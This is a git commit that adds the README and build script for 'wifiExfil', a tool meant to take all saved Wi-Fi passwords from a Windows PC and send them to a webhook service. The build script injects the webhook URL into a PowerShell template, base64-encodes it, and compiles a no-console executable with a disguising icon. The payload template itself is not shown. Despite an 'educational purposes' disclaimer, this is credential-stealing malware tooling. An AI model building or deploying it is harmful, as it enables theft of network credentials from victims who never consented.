3aaa577c31d72d9774849c4de42c0618556a5375
Rafael2026 <rafaaguilarmunoz@gmail.com>
2023-06-06 17:33:28 +0200

    Know saved passwords of wifi connections

---
+++ Wifi saved password/README.md
@@ -0,0 +1,26 @@
+# wifiExfil
+
+Exfiltrate all saved Wi-Fi passwords from a Windows PC.
+
+## Requirements
+
+1. On your Windows machine install Python from https://www.python.org/downloads/
+
+2. Install pyinstaller, run `pip install pyinstaller` from cmd
+
+3. Create a webhook from one of the following sites:
+- https://requestinspector.com
+- https://beeceptor.com
+- https://webhook.site
+
+## Instructions (Windows Only)
+1. Download repo as ZIP
+
+2. Run builder
+```bash
+python3 build.py <webhook_url>
+```
+Executable will be placed inside the `dist` folder
+
+## Disclaimer
+Usage of these scripts for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.
---
+++ Wifi saved password/build.py
@@ -0,0 +1,37 @@
+import subprocess
+import sys
+from base64 import b64encode
+from re import sub
+
+def build():
+    if len(sys.argv) != 2:
+        print(" Usage:\tpython3 build.py <webhook_url>")
+        print("Bye...\n")
+        sys.exit(1)
+
+    hookurl = sys.argv[1]
+    
+    with open('template.ps1', 'r+') as file:
+        content = file.read()
+        new_content = sub('WEBHOOK_URL_HERE', hookurl, content)
+        b64ps = b64encode(new_content.encode('utf16')[2:]).decode()
+
+    with open('script.py', 'r+') as file:
+        content = file.read()
+        regex = r'(?<=b64 = ")[^"]*(?=")'
+        new_content = sub(regex, b64ps, content)
+        file.seek(0)
+        file.write(new_content)
+        file.truncate()
+        
+def compile():
+    cmd = ['cmd', '/c' ,'pyinstaller', 'script.py', '--onefile', '--noconsole', '--icon', 'icon.ico', '--name', 'wifiExfil', '--log-level', 'ERROR']
+    subprocess.run(cmd,stdout=subprocess.DEVNULL)
+    print("[+] Done!")
+
+def main():
+    build()
+    compile()
+
+if __name__ == "__main__":
+    main()
